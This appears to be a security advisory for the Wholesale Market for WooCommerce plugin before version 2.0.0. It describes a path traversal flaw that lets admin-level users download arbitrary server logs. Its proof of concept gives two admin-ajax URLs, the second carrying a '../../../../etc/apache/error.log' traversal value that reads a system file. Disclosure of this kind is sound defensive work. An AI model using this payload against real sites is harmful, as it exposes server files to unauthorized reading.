## WordPress Plugin Vulnerabilities

# Wholesale Market for WooCommerce < 2.0.0 - Admin+ Arbitrary Log Download

### Description

The plugin does not validate user input against path traversal attacks, allowing high privilege users such as admin to download arbitrary logs from the server even when they should not be able to (for example in multisite)

### Proof of Concept

First call https://example.com/wp-admin/admin-ajax.php?action=ced\_cwsm\_csv\_import\_export\_module\_read\_csv which will create the log directory
Then call http://example.com/wp-admin/admin-ajax.php?action=ced\_cwsm\_csv\_import\_export\_module\_download\_error\_log&tab=ced\_cwsm\_plugin&section=ced\_cwsm\_csv\_import\_export\_module&nonce=&ced\_cwsm\_log\_download=../../../../etc/apache/error.log to download the /etc/apache/error.log
